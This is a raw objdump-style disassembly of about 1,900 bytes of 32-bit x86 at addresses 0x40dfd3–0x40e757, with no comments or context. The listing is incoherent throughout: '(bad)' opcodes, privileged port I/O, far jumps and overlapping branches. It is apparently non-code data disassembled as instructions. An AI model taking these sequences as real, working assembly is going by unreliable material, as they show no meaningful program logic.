  40dfd3:	adc    al,bh
  40dfd5:	repnz out dx,eax
  40dfd7:	stos   BYTE PTR es:[edi],al
  40dfd8:	adc    edx,ebp
  40dfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfdb:	cmc    
  40dfdc:	jns    0x40e017
  40dfde:	fild   DWORD PTR [eax-0x4e6abbac]
  40dfe4:	inc    esp
  40dfe6:	test   al,0x7b
  40dfe8:	(bad)  
  40dfe9:	sub    dl,BYTE PTR [esi]
  40dfeb:	and    BYTE PTR [ebx],ch
  40dfed:	loope  0x40df94
  40dfef:	out    dx,al
  40dff0:	stos   DWORD PTR es:[edi],eax
  40dff1:	pop    esp
  40dff2:	sbb    al,0xbf
  40dff4:	push   esi
  40dff5:	dec    ebx
  40dff6:	fs add edx,edx
  40dff9:	mov    cl,0xde
  40dffb:	or     DWORD PTR [edx+edi*8+0x22406580],0xfffffff3
  40e003:	ds pop edx
  40e005:	push   0x1dca7569
  40e00a:	mov    bl,0x19
  40e00c:	fwait
  40e00d:	arpl   WORD PTR [esi-0x3f1e47ef],cx
  40e013:	push   edx
  40e014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e015:	mov    bl,0x5
  40e017:	add    ah,BYTE PTR gs:0x24a9406f
  40e01e:	sbb    ah,dh
  40e020:	arpl   bp,bx
  40e022:	dec    ebp
  40e023:	fst    DWORD PTR [eax+0x60]
  40e026:	push   eax
  40e027:	aad    0x80
  40e029:	mov    al,BYTE PTR [edx*1-0x45301bd0]
  40e030:	or     dl,BYTE PTR [eax+0x64ee0047]
  40e036:	sbb    ebp,DWORD PTR [ecx]
  40e038:	mov    cl,0xdb
  40e03a:	push   ebx
  40e03b:	enter  0x8f9f,0xe9
  40e03f:	push   esi
  40e040:	sub    eax,0x25c2789f
  40e045:	sbb    BYTE PTR [edi+0x2],dh
  40e048:	dec    edx
  40e049:	push   ds
  40e04a:	retf   0xd5e7
  40e04d:	and    DWORD PTR [edx+0x4d58a063],0x70
  40e054:	test   DWORD PTR [ecx-0x57],0x5cde818a
  40e05b:	adc    edx,DWORD PTR [eax]
  40e05d:	and    al,0x6c
  40e05f:	je     0x40e018
  40e061:	sub    BYTE PTR [ebp-0x6b],ch
  40e064:	sub    DWORD PTR [ebp-0x5be358b],eax
  40e06a:	jp     0x40e07e
  40e06c:	je     0x40e006
  40e06e:	test   eax,0x2638d77e
  40e073:	or     al,BYTE PTR [ebx+0x4a]
  40e076:	jp     0x40e03e
  40e078:	popf   
  40e079:	popa   
  40e07a:	add    al,0x7e
  40e07c:	adc    BYTE PTR [eax+0x39fa8759],ch
  40e082:	mov    ds:0xc5d2e228,eax
  40e087:	mov    ebx,DWORD PTR [esp+edi*4+0x70]
  40e08b:	add    edi,ecx
  40e08d:	repz sub BYTE PTR [edi+0x2a],dl
  40e091:	xor    al,0x9b
  40e093:	dec    ebp
  40e094:	mov    dh,0xc6
  40e097:	sbb    BYTE PTR [edi],bl
  40e099:	pop    ds
  40e09a:	out    0x6d,eax
  40e09c:	outs   dx,DWORD PTR ds:[esi]
  40e09d:	jge    0x40e0ca
  40e09f:	sar    DWORD PTR [ebx],0x7d
  40e0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a3:	mov    ecx,gs
  40e0a5:	mov    ah,0xb7
  40e0a7:	cmp    BYTE PTR [ecx+0x72],dh
  40e0aa:	cdq    
  40e0ab:	dec    ebx
  40e0ac:	xchg   edi,eax
  40e0ad:	(bad)  
  40e0ae:	mov    eax,0x89cbb170
  40e0b3:	push   ebx
  40e0b4:	fistp  DWORD PTR [esi+edi*4-0x4e]
  40e0b8:	(bad)  
  40e0b9:	cli    
  40e0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0bb:	in     al,0xd2
  40e0bd:	push   ebp
  40e0be:	fsubr  DWORD PTR [edi+eax*1+0x24]
  40e0c2:	std    
  40e0c3:	inc    eax
  40e0c4:	sbb    DWORD PTR [ebx],ebx
  40e0c6:	std    
  40e0c7:	jge    0x40e063
  40e0c9:	sub    DWORD PTR [eax+eax*8+0x19063150],eax
  40e0d0:	inc    ebx
  40e0d1:	adc    al,BYTE PTR [edx]
  40e0d3:	push   ecx
  40e0d4:	dec    esi
  40e0d5:	jge    0x40e107
  40e0d7:	dec    esp
  40e0d8:	rcr    al,0x5
  40e0db:	mov    esp,0x3b677bec
  40e0e0:	xor    bl,ch
  40e0e2:	sub    al,0x74
  40e0e4:	pushf  
  40e0e5:	mov    ebp,0x523a8724
  40e0ea:	fild   DWORD PTR [eax+0x528ea44c]
  40e0f0:	(bad)  
  40e0f1:	jae    0x40e128
  40e0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0f4:	ror    BYTE PTR [ebx+0x12],0xf5
  40e0f8:	sub    BYTE PTR [esi+0x2fa472c9],bl
  40e0fe:	cwde   
  40e0ff:	xchg   ecx,eax
  40e100:	repnz cmp DWORD PTR [ebx-0x351bbc42],ecx
  40e107:	add    al,0x60
  40e109:	mov    ecx,0xa7a5d66e
  40e10e:	outs   dx,DWORD PTR ds:[esi]
  40e10f:	scas   eax,DWORD PTR es:[edi]
  40e110:	(bad)  
  40e111:	loop   0x40e0a7
  40e113:	popa   
  40e114:	jmp    0x5ed5cd94
  40e119:	cmp    al,0x1d
  40e11b:	retf   
  40e11c:	fnstenv [ecx]
  40e11e:	in     al,dx
  40e11f:	fimul  DWORD PTR [ecx]
  40e121:	sub    al,0x33
  40e123:	add    bl,ch
  40e125:	push   es
  40e126:	mov    WORD PTR [esi+0x47bb309],es
  40e12c:	mov    esi,0xa9451317
  40e131:	ffree  st(0)
  40e133:	add    dh,BYTE PTR gs:[ecx+0x1c]
  40e137:	(bad)  
  40e138:	dec    esp
  40e139:	mov    ds:0x550b5a77,eax
  40e13e:	adc    ah,ah
  40e140:	mov    dh,0xb7
  40e142:	frstor [eax]
  40e144:	add    BYTE PTR [ecx],cl
  40e146:	in     al,0xf4
  40e148:	jg     0x40e141
  40e14a:	inc    ebp
  40e14b:	push   edx
  40e14c:	push   es
  40e14d:	nop
  40e14e:	(bad)  
  40e14f:	jnp    0x40e188
  40e151:	add    al,0x9b
  40e153:	adc    bh,BYTE PTR [eax]
  40e155:	fcom   QWORD PTR [eax+0xfdae441]
  40e15b:	xchg   edx,eax
  40e15c:	jmp    0x40e1a2
  40e15e:	push   edi
  40e15f:	inc    ebp
  40e160:	mov    eax,0x48a28b5e
  40e165:	xor    DWORD PTR [eax+0x24b7b89b],eax
  40e16b:	mov    eax,ds:0x6b518fe9
  40e170:	dec    edi
  40e171:	push   edx
  40e172:	pop    edx
  40e173:	lods   eax,DWORD PTR ds:[esi]
  40e174:	xor    cl,dh
  40e176:	push   ds
  40e177:	cmp    BYTE PTR [eax+0x52],0x9
  40e17b:	cmp    edi,DWORD PTR ds:0x2861ddf8
  40e181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e182:	stos   BYTE PTR es:[edi],al
  40e183:	cwde   
  40e184:	jecxz  0x40e18d
  40e186:	push   0xffffff82
  40e188:	mov    BYTE PTR [ecx+0x3c],cl
  40e18b:	and    bh,BYTE PTR [edi+ecx*4]
  40e18e:	fsub   DWORD PTR [ecx-0x58]
  40e191:	mov    esi,0xab5411e7
  40e196:	cli    
  40e197:	push   ds
  40e198:	adc    BYTE PTR [esp+esi*4-0x2127494a],0xdc
  40e1a0:	in     al,0x5c
  40e1a2:	dec    esi
  40e1a3:	push   ebp
  40e1a4:	stos   BYTE PTR es:[edi],al
  40e1a5:	push   esp
  40e1a6:	sub    cl,BYTE PTR [esp+ecx*2+0x4e]
  40e1aa:	lock xchg BYTE PTR [edi+0x66d6f896],al
  40e1b1:	xor    DWORD PTR [ecx-0x3475654f],0x20
  40e1b8:	pusha  
  40e1b9:	jne    0x40e230
  40e1bb:	adc    DWORD PTR [edi-0x3436c5a2],0x27
  40e1c2:	xchg   esi,eax
  40e1c3:	jns    0x40e1a6
  40e1c5:	clc    
  40e1c6:	pop    ecx
  40e1c7:	mov    esi,0x6b2ae4f6
  40e1cc:	jmp    0x40e1f3
  40e1ce:	ss mov dh,0xc7
  40e1d1:	and    BYTE PTR [esi+0x414d285],bl
  40e1d7:	dec    ebp
  40e1d8:	test   al,0xf8
  40e1da:	mov    al,al
  40e1dc:	inc    ebp
  40e1dd:	mov    ds:0x55274291,al
  40e1e2:	and    eax,0x44c9aed0
  40e1e7:	ret    
  40e1e8:	ja     0x40e18b
  40e1ea:	and    ebx,DWORD PTR [ebp-0x54e1098e]
  40e1f0:	add    al,0x5b
  40e1f2:	add    al,0xa1
  40e1f4:	and    DWORD PTR [ebp-0x62ac3edd],edi
  40e1fa:	pop    ecx
  40e1fb:	iret   
  40e1fc:	mov    ebp,0x24921d40
  40e201:	push   ds
  40e202:	mov    eax,edx
  40e204:	test   BYTE PTR [edi*1+0x4a1534cb],ch
  40e20b:	xor    al,BYTE PTR [ecx+0x4a]
  40e20e:	sub    DWORD PTR [ebx],esi
  40e210:	push   eax
  40e211:	cmp    ecx,ecx
  40e213:	ds inc ebx
  40e215:	add    al,dl
  40e217:	sbb    cl,ch
  40e219:	in     al,dx
  40e21a:	arpl   WORD PTR [ecx],di
  40e21c:	shl    DWORD PTR [ebx+0x46],0xd
  40e220:	mov    al,0xdd
  40e222:	out    0xa8,eax
  40e224:	adc    eax,0x10ecdc66
  40e229:	push   ss
  40e22a:	sub    al,0x65
  40e22c:	and    esi,DWORD PTR ds:[ecx-0x54abe32d]
  40e233:	add    ah,BYTE PTR es:0xaf11070c
  40e23a:	mov    ebp,0xc56a8c67
  40e23f:	arpl   WORD PTR ds:0x974ea2ca,di
  40e245:	or     DWORD PTR [eax+0x59828038],ebx
  40e24b:	mov    al,0xcb
  40e24d:	shl    BYTE PTR [esi-0xf],0xd
  40e251:	outs   dx,DWORD PTR ds:[esi]
  40e252:	ins    DWORD PTR es:[edi],dx
  40e253:	fisttp DWORD PTR ds:0xe10b6802
  40e259:	xor    DWORD PTR [eax],ebx
  40e25b:	hlt    
  40e25c:	push   ebp
  40e25d:	aam    0x53
  40e25f:	leave  
  40e260:	je     0x40e2d8
  40e262:	push   ds
  40e263:	bound  ebp,QWORD PTR [ebx]
  40e265:	dec    esi
  40e266:	(bad)  
  40e268:	imul   esp,DWORD PTR [esi-0x107adfb4],0x8b01b93b
  40e272:	lods   al,BYTE PTR ds:[esi]
  40e273:	stc    
  40e274:	xlat   BYTE PTR ds:[ebx]
  40e275:	inc    edx
  40e276:	add    eax,0x35172d3b
  40e27b:	pop    ss
  40e27c:	jne    0x40e2f6
  40e27e:	mov    esi,0x9f9cce9a
  40e283:	sub    BYTE PTR [ebp+ebx*4+0xe],dh
  40e287:	inc    eax
  40e288:	dec    edx
  40e289:	dec    ecx
  40e28a:	dec    ecx
  40e28b:	xchg   esi,eax
  40e28c:	cmp    ah,cl
  40e28e:	aaa    
  40e28f:	adc    DWORD PTR [esi-0x13],ebx
  40e292:	push   ecx
  40e293:	xchg   edx,eax
  40e294:	push   ebp
  40e295:	les    esp,FWORD PTR [eax-0x3949b3b4]
  40e29b:	fwait
  40e29c:	and    DWORD PTR [edx-0x80],esp
  40e29f:	cmp    BYTE PTR [edx+0x3cac7190],cl
  40e2a5:	push   cs
  40e2a6:	sahf   
  40e2a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2a8:	push   0xf
  40e2aa:	and    al,0x89
  40e2ac:	lods   eax,DWORD PTR ds:[esi]
  40e2ad:	and    cx,WORD PTR [ebp+0x1f]
  40e2b1:	cwde   
  40e2b2:	(bad)  [eax-0x112f7be8]
  40e2b8:	leave  
  40e2b9:	shr    ch,0x37
  40e2bc:	ins    DWORD PTR es:[edi],dx
  40e2bd:	pop    edi
  40e2be:	mov    eax,0xcb02fe78
  40e2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c4:	iret   
  40e2c5:	add    al,ah
  40e2c7:	pop    es
  40e2c8:	add    DWORD PTR [ebp-0xe4e66b6],edx
  40e2ce:	jno    0x40e2b6
  40e2d0:	out    0x66,al
  40e2d2:	jns    0x40e2b1
  40e2d4:	jmp    0x40e2c4
  40e2d6:	jecxz  0x40e2f5
  40e2d8:	out    dx,eax
  40e2d9:	jl     0x40e2f3
  40e2db:	fs dec esp
  40e2dd:	mov    bh,0xd7
  40e2df:	out    0xec,al
  40e2e1:	(bad)  [ebx-0x64]
  40e2e4:	cmp    BYTE PTR [ecx-0x6a],dh
  40e2e7:	scas   eax,DWORD PTR es:[edi]
  40e2e8:	cmp    eax,0x9ea78e71
  40e2ed:	pop    ebp
  40e2ee:	out    0xdc,al
  40e2f0:	stc    
  40e2f1:	mov    BYTE PTR [ebx],ch
  40e2f3:	sbb    ecx,DWORD PTR ds:0xb2a4cec2
  40e2f9:	daa    
  40e2fa:	xchg   esp,eax
  40e2fb:	mov    eax,es:0x854a0bc
  40e301:	add    DWORD PTR [esi+0x9],0x4335881d
  40e308:	mov    al,0x5e
  40e30a:	or     ch,bh
  40e30c:	je     0x40e2d0
  40e30e:	ja     0x40e2ae
  40e310:	xor    al,0x7d
  40e312:	dec    edi
  40e313:	cmc    
  40e314:	loopne 0x40e368
  40e316:	jmp    0x40e2f4
  40e318:	jns    0x40e2cf
  40e31a:	inc    eax
  40e31b:	out    0x6,eax
  40e31d:	rol    BYTE PTR [ebx],0x3d
  40e320:	daa    
  40e321:	and    BYTE PTR [ecx],dh
  40e323:	rcr    BYTE PTR [esi+eiz*1+0x2a],1
  40e327:	sbb    eax,0xc61c1597
  40e32c:	test   al,0x27
  40e32e:	shl    ecx,cl
  40e330:	and    eax,0xe386dd84
  40e335:	jp     0x40e2ed
  40e337:	jmp    0xc4dd:0x69321dbd
  40e33e:	adc    DWORD PTR ds:0x48e81ec1,edx
  40e344:	je     0x40e309
  40e346:	and    al,0x4
  40e348:	(bad)  
  40e349:	and    edx,DWORD PTR [esi+ebx*2+0x7725974c]
  40e350:	out    0xba,al
  40e352:	fdiv   st,st(7)
  40e354:	mov    ch,0xb9
  40e356:	push   cs
  40e357:	aad    0x77
  40e359:	mov    ebx,esp
  40e35b:	nop
  40e35c:	leave  
  40e35d:	mov    DWORD PTR [edx+0x66],edi
  40e360:	data16 ins BYTE PTR es:[edi],dx
  40e362:	adc    DWORD PTR [edx-0xb],edi
  40e365:	cmp    al,0x8f
  40e367:	push   eax
  40e368:	pop    ss
  40e369:	mov    ds:0x1ff3b5c9,al
  40e36e:	sti    
  40e36f:	fadd   st,st(7)
  40e371:	or     cl,BYTE PTR [ebx]
  40e373:	add    eax,0x2bb6eade
  40e378:	add    al,0x20
  40e37a:	test   al,dl
  40e37c:	dec    ecx
  40e37d:	xor    al,0xc
  40e37f:	push   ecx
  40e380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e381:	cmp    ebp,ebp
  40e383:	aaa    
  40e384:	shl    BYTE PTR [ecx],cl
  40e386:	aam    0xe9
  40e388:	neg    DWORD PTR [edi]
  40e38a:	jne    0x40e387
  40e38c:	in     eax,dx
  40e38d:	adc    al,0xaf
  40e38f:	jg     0x40e36e
  40e391:	pop    es
  40e392:	enter  0x579d,0xe4
  40e396:	and    DWORD PTR [eax],ebp
  40e398:	bound  edx,QWORD PTR [edx]
  40e39a:	out    dx,al
  40e39b:	mov    cl,0x52
  40e39d:	dec    edx
  40e39e:	push   0xffffffcd
  40e3a0:	es xchg ebp,eax
  40e3a2:	push   0x55
  40e3a4:	gs stos BYTE PTR es:[edi],al
  40e3a6:	lea    esp,[edx]
  40e3a8:	push   es
  40e3a9:	std    
  40e3aa:	ds push ecx
  40e3ac:	sbb    al,0xdb
  40e3ae:	inc    ecx
  40e3af:	imul   esp,DWORD PTR [esi-0x52],0xffffffe1
  40e3b3:	adc    ah,BYTE PTR [edi-0x676c7202]
  40e3b9:	pusha  
  40e3ba:	pop    eax
  40e3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3bc:	adc    al,0x56
  40e3be:	je     0x40e37e
  40e3c0:	sti    
  40e3c1:	sub    BYTE PTR ds:0x11f7f97f,bl
  40e3c7:	push   0xffffffa0
  40e3c9:	test   BYTE PTR [ecx-0x5c],dl
  40e3cc:	hlt    
  40e3cd:	aas    
  40e3ce:	sub    DWORD PTR [ebp-0x39db8e0f],ebp
  40e3d4:	inc    ecx
  40e3d5:	xor    eax,DWORD PTR ds:0x52d34de5
  40e3db:	and    al,0x7f
  40e3dd:	pushf  
  40e3de:	push   eax
  40e3df:	jno    0x40e3ec
  40e3e1:	adc    eax,0x2e5ca7df
  40e3e6:	arpl   WORD PTR [edx+0x3dbbf4f6],si
  40e3ec:	fcmovu st,st(3)
  40e3ee:	sub    eax,0x833e9ece
  40e3f3:	adc    dl,al
  40e3f5:	mov    edx,0x2e2ef726
  40e3fa:	xor    dh,BYTE PTR ds:0xdfc3c935
  40e400:	repnz out 0x79,eax
  40e403:	(bad)  
  40e404:	sti    
  40e405:	(bad)  
  40e407:	jo     0x40e3d9
  40e409:	gs jae 0x40e3bf
  40e40c:	lds    ecx,FWORD PTR [ebx+0x2f]
  40e40f:	lahf   
  40e410:	loope  0x40e40b
  40e412:	mov    ds:0xc5e17917,eax
  40e417:	adc    eax,0x32f4bf8e
  40e41c:	pop    ss
  40e41d:	cs (bad) 
  40e41f:	fldz   
  40e421:	out    dx,eax
  40e422:	and    DWORD PTR [edx-0x7f28efb5],ecx
  40e428:	or     DWORD PTR [eax],ecx
  40e42a:	test   BYTE PTR [eax+0x10],0x80
  40e42e:	sbb    BYTE PTR [eax],al
  40e430:	add    edx,DWORD PTR [edi+edx*8-0x388efc5f]
  40e437:	cmp    al,0x30
  40e439:	sbb    BYTE PTR [edi],bh
  40e43b:	mov    edi,0x2f6e4944
  40e440:	popf   
  40e441:	aad    0x57
  40e443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e444:	push   ss
  40e445:	test   al,0x70
  40e447:	imul   ebx,edi,0x2224cfba
  40e44d:	int    0x8
  40e44f:	sub    al,0x13
  40e451:	shl    DWORD PTR gs:[edi+0x24],0x7f
  40e456:	stos   BYTE PTR es:[edi],al
  40e457:	jae    0x40e414
  40e459:	dec    esp
  40e45a:	add    BYTE PTR [ebx+0x3cfd5d30],cl
  40e460:	inc    ebx
  40e461:	push   esp
  40e462:	and    dh,BYTE PTR [ebp-0x411727fb]
  40e468:	or     al,0xf1
  40e46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e46b:	cmp    bl,BYTE PTR [ebx-0x1db924b7]
  40e471:	dec    esp
  40e472:	sub    al,0x12
  40e474:	out    dx,al
  40e475:	cmc    
  40e476:	mov    WORD PTR [edx-0x2b44dd1c],cs
  40e47c:	mov    al,0x99
  40e47e:	and    al,0x1e
  40e480:	xor    cl,BYTE PTR [ecx+0x66357a8]
  40e486:	and    ecx,0xffffff8e
  40e489:	and    BYTE PTR [eax+ecx*1],0x82
  40e48d:	imul   esp,DWORD PTR [ebp+0x3],0xffffffbe
  40e491:	push   esp
  40e492:	js     0x40e466
  40e494:	ins    DWORD PTR es:[edi],dx
  40e495:	push   0x381d3537
  40e49a:	popf   
  40e49b:	or     DWORD PTR [eax+0x7c],ebx
  40e49e:	pushf  
  40e49f:	cmp    edi,0x120e5100
  40e4a5:	sbb    DWORD PTR [edx],esp
  40e4a7:	sub    al,0x22
  40e4a9:	pop    esp
  40e4aa:	idiv   DWORD PTR [esi]
  40e4ac:	out    dx,al
  40e4ad:	mov    esi,0xa8df113c
  40e4b2:	xor    DWORD PTR [eax-0xc],esi
  40e4b5:	mov    ecx,0x894b2f4
  40e4ba:	dec    edi
  40e4bb:	stc    
  40e4bc:	lock dec ebx
  40e4be:	push   edx
  40e4bf:	push   edx
  40e4c0:	test   eax,0xad2501d7
  40e4c5:	cmc    
  40e4c6:	inc    ebp
  40e4c7:	lock jne 0x40e4b0
  40e4ca:	(bad)  
  40e4cb:	shl    DWORD PTR [eax+0x40],0xac
  40e4cf:	shl    DWORD PTR [ecx-0x67],cl
  40e4d2:	sti    
  40e4d3:	test   ecx,edx
  40e4d5:	shl    BYTE PTR [ecx+0x6f7abb32],1
  40e4db:	data16 js 0x40e4b7
  40e4de:	ss or  al,0x43
  40e4e1:	dec    edx
  40e4e2:	inc    ecx
  40e4e3:	pusha  
  40e4e4:	pop    es
  40e4e5:	mov    cl,0xd0
  40e4e7:	xchg   edx,eax
  40e4e8:	pop    edi
  40e4e9:	jmp    0x83d4:0x4cf730e7
  40e4f0:	push   0xffffffe3
  40e4f2:	jne    0x40e50a
  40e4f4:	adc    eax,0x1d4ff2a5
  40e4f9:	sub    esi,DWORD PTR ds:0x8f3cf704
  40e4ff:	push   edx
  40e500:	mov    ecx,0x512a504c
  40e505:	test   eax,0x4938854
  40e50a:	sbb    edi,eax
  40e50c:	je     0x40e4e9
  40e50e:	ins    DWORD PTR es:[edi],dx
  40e50f:	pop    esi
  40e510:	cmp    bh,BYTE PTR [esi-0x24]
  40e513:	mov    edx,0x2ad5aa9d
  40e518:	aad    0x6a
  40e51a:	xchg   ebp,eax
  40e51b:	out    0xf8,al
  40e51d:	sbb    ch,cl
  40e51f:	inc    esi
  40e520:	xor    DWORD PTR [edi+0x7d],0xffffffeb
  40e524:	mov    ebp,0x3a6df3bc
  40e529:	sub    DWORD PTR [ebp-0x42829f21],eax
  40e52f:	retf   
  40e530:	jbe    0x40e55d
  40e532:	out    0xea,al
  40e534:	pop    edx
  40e535:	(bad)  
  40e536:	retf   
  40e537:	scas   eax,DWORD PTR es:[edi]
  40e538:	lods   al,BYTE PTR ds:[esi]
  40e539:	jb     0x40e537
  40e53b:	in     eax,0xd3
  40e53d:	mov    esp,0xc5cbaa7c
  40e542:	sub    ecx,DWORD PTR ds:0x854576a2
  40e548:	add    BYTE PTR [edi-0x7b4d5e59],dl
  40e54e:	xor    eax,0xef2b1200
  40e553:	sbb    DWORD PTR [eax+ebp*1],0xffffffc6
  40e557:	nop
  40e558:	hlt    
  40e559:	push   eax
  40e55a:	inc    esi
  40e55b:	aas    
  40e55c:	ins    DWORD PTR es:[edi],dx
  40e55d:	dec    edi
  40e55e:	xor    BYTE PTR [esi],dh
  40e560:	test   DWORD PTR [edx*4-0x665bc04],eax
  40e567:	repz pop edx
  40e569:	cmovg  edi,DWORD PTR [eiz*4-0x20b747fe]
  40e571:	hlt    
  40e572:	test   eax,0x9e50c35a
  40e577:	mov    eax,DWORD PTR [esi]
  40e579:	xchg   esp,eax
  40e57a:	mov    edx,0x52679b9f
  40e57f:	pusha  
  40e580:	rcl    DWORD PTR [edi-0x33],1
  40e583:	mov    eax,0x827b5d2e
  40e588:	ret    
  40e589:	cmp    al,0x2c
  40e58b:	popa   
  40e58c:	cmp    edi,DWORD PTR ds:0x3e61909c
  40e592:	out    0x50,al
  40e594:	(bad)  
  40e595:	mov    edx,0x89884ca3
  40e59a:	retf   0xd50a
  40e59d:	push   0x1e1c8e08
  40e5a2:	sbb    esi,DWORD PTR [ecx+0x1]
  40e5a5:	mov    edx,0x7df7d3e3
  40e5aa:	fwait
  40e5ab:	jp     0x40e55a
  40e5ad:	mov    al,ds:0xf1b45cbd
  40e5b2:	jbe    0x40e568
  40e5b4:	fwait
  40e5b5:	dec    edx
  40e5b6:	or     BYTE PTR [edx+0x238d66fe],dl
  40e5bc:	mov    ds:0x68a21f70,eax
  40e5c1:	pop    eax
  40e5c2:	test   al,0x2
  40e5c4:	in     al,dx
  40e5c5:	adc    al,0xe5
  40e5c7:	out    0xc6,eax
  40e5c9:	adc    al,al
  40e5cb:	into   
  40e5cc:	or     al,0xe1
  40e5ce:	jp     0x40e63a
  40e5d0:	inc    eax
  40e5d1:	sahf   
  40e5d2:	adc    DWORD PTR [eax*1+0x2ab90a],edx
  40e5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5da:	xor    BYTE PTR [eax+0x68],dl
  40e5dd:	dec    ecx
  40e5de:	pop    ebx
  40e5df:	or     eax,0xa6a7c602
  40e5e4:	adc    al,0x8c
  40e5e6:	xlat   BYTE PTR ds:[ebx]
  40e5e7:	shl    BYTE PTR [esi-0x7aed1229],cl
  40e5ed:	and    DWORD PTR [ecx+0x18],esp
  40e5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5f1:	out    0xbb,eax
  40e5f3:	pop    ds
  40e5f4:	fucomp st(5)
  40e5f6:	and    eax,0x22893dbd
  40e5fb:	and    ch,BYTE PTR [ebp+0x4]
  40e5fe:	adc    bh,BYTE PTR [ecx+0x2a8e9167]
  40e604:	lea    ecx,fs:[eax+0x62c65842]
  40e60b:	mov    cs,WORD PTR [ebp-0x64]
  40e60e:	imul   ebx,DWORD PTR [edx+0x7d38c30c],0xffffffe9
  40e615:	and    ch,BYTE PTR [ebx]
  40e617:	loope  0x40e614
  40e619:	mov    al,cl
  40e61b:	xchg   ebp,eax
  40e61c:	retf   
  40e61d:	inc    esp
  40e61e:	push   ecx
  40e61f:	inc    esp
  40e620:	mov    edi,0xebd7a7df
  40e625:	rcl    ebx,1
  40e627:	imul   eax,eax,0xcd3c35cc
  40e62d:	add    al,0x1b
  40e62f:	lea    ebx,[edx]
  40e631:	jecxz  0x40e616
  40e633:	jecxz  0x40e621
  40e635:	fnstsw WORD PTR [ebx]
  40e637:	iret   
  40e638:	jge    0x40e631
  40e63a:	dec    esp
  40e63b:	repz fstp QWORD PTR [edi]
  40e63e:	mov    edx,0xb413df07
  40e643:	cmp    eax,DWORD PTR [ebx]
  40e645:	pop    esi
  40e646:	ds jno 0x40e5da
  40e649:	out    0x8f,eax
  40e64b:	scas   al,BYTE PTR es:[edi]
  40e64c:	jo     0x40e642
  40e64e:	fcom   DWORD PTR [ebp-0x62]
  40e651:	jp     0x40e651
  40e653:	sbb    al,0x27
  40e655:	dec    edi
  40e656:	or     DWORD PTR [edx],edi
  40e658:	in     eax,dx
  40e659:	push   es
  40e65a:	inc    esp
  40e65b:	xor    eax,0x6543cea8
  40e660:	sbb    al,BYTE PTR [edx-0x2bcaabee]
  40e666:	(bad)  
  40e667:	cmp    cl,dl
  40e669:	sti    
  40e66a:	adc    BYTE PTR [edi+0x52112fd4],dh
  40e670:	(bad)  
  40e671:	ss jmp 0x40e622
  40e674:	adc    al,0xc6
  40e676:	push   ebp
  40e677:	sub    al,0xc0
  40e679:	dec    edi
  40e67a:	adc    al,bh
  40e67c:	or     BYTE PTR [ebx],dl
  40e67e:	jno    0x40e667
  40e680:	inc    edx
  40e681:	jle    0x40e6ea
  40e683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e684:	jmp    0x2ca4bcd7
  40e689:	addr16 mov al,ds:0xdcb3
  40e68d:	inc    ebx
  40e68e:	adc    ebp,DWORD PTR [edi+0x1dc22830]
  40e694:	pop    esp
  40e695:	jmp    0x7bd8:0x42f9993f
  40e69c:	gs or  eax,0xa34a8e7d
  40e6a2:	aad    0x89
  40e6a4:	and    bh,BYTE PTR [esi+0x428066a2]
  40e6aa:	sbb    al,0x9
  40e6ac:	jmp    0x4510:0x6c5a584d
  40e6b3:	popf   
  40e6b4:	sbb    eax,0xfbef9dc7
  40e6b9:	mov    ah,0xdb
  40e6bb:	ins    DWORD PTR es:[edi],dx
  40e6bc:	mov    ds:0x184ca28,al
  40e6c1:	jmp    0x40e6a6
  40e6c3:	into   
  40e6c4:	(bad)  
  40e6c5:	fsubrp st(1),st
  40e6c7:	div    BYTE PTR [ebx+ebx*4-0x3ce5fc8e]
  40e6ce:	fidiv  WORD PTR [ebp+0x6b2ade5a]
  40e6d4:	fcomp  QWORD PTR [ebp-0x53]
  40e6d7:	push   esi
  40e6d8:	retf   
  40e6d9:	fiadd  DWORD PTR [eax]
  40e6db:	repnz sbb DWORD PTR [ebx-0x76],edx
  40e6df:	or     al,bl
  40e6e1:	mov    eax,0xf37dcd00
  40e6e6:	push   ds
  40e6e7:	test   BYTE PTR [ebp+0x116b8254],bl
  40e6ed:	jle    0x40e680
  40e6ef:	popf   
  40e6f0:	rcr    ebp,0xf
  40e6f3:	sub    DWORD PTR [ebx+0x18],esi
  40e6f6:	push   cs
  40e6f7:	xchg   DWORD PTR [eax],ecx
  40e6f9:	iret   
  40e6fa:	and    ecx,DWORD PTR [eax]
  40e6fc:	add    al,BYTE PTR [edi+ebp*8-0x52c2cecd]
  40e703:	dec    edx
  40e704:	xchg   DWORD PTR ds:0x479ef887,ecx
  40e70a:	mov    bh,0xdb
  40e70c:	gs fsubr st,st(7)
  40e70f:	adc    eax,DWORD PTR [edi+0x11]
  40e712:	mov    eax,ds:0x145a584e
  40e717:	jmp    0x40e6e9
  40e719:	jmp    0x40e791
  40e71b:	or     DWORD PTR [ebx+0x25],ecx
  40e71e:	add    ch,BYTE PTR [ebp+0x7f]
  40e721:	lock xor eax,0x6652291
  40e727:	xor    eax,0x66994328
  40e72c:	add    dl,dl
  40e72e:	sbb    esp,esp
  40e730:	cli    
  40e731:	cmp    BYTE PTR [ebx],ah
  40e733:	stc    
  40e734:	int    0x7b
  40e736:	fdiv   DWORD PTR [ebx+eiz*8-0x1a]
  40e73a:	das    
  40e73b:	mov    bh,0xdf
  40e73d:	dec    ebp
  40e73e:	add    BYTE PTR [edx-0x2dca3ad0],0x96
  40e745:	and    al,0x9
  40e747:	fcmovnu st,st(3)
  40e749:	ins    DWORD PTR es:[edi],dx
  40e74a:	mov    dh,0xb6
  40e74c:	pop    edx
  40e74d:	pushf  
  40e74e:	cmp    DWORD PTR [ebx-0x2a],esi
  40e751:	mov    ds:0xccb97285,al
  40e756:	(bad)  
  40e757:	in     al,0x4
